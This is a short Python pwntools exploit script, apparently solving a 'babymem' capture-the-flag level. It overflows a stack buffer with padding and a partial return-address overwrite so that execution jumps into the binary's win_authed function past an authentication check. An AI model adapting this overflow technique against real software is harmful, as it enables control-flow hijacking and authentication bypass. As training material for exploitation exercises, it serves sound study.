from pwn import *

elf = ELF('/challenge/babymem-level-8-1')
context.arch = "amd64"

io = elf.process()
buff_len = 0xA0+8 #94  #cyclic - 1  #LEA        RAX=>local_a8,[RBP + -0xa0]
buff_addr = p16(0x639+0x1c) #objdump win_authed+offset per saltare jne

PADDING = b'A'*(buff_len-9)
PAYLOAD = p64(0x4141414141414141) + p8(0) + PADDING + buff_addr
io.sendline(f"{len(PAYLOAD)}")
io.sendline(PAYLOAD)
io.interactive()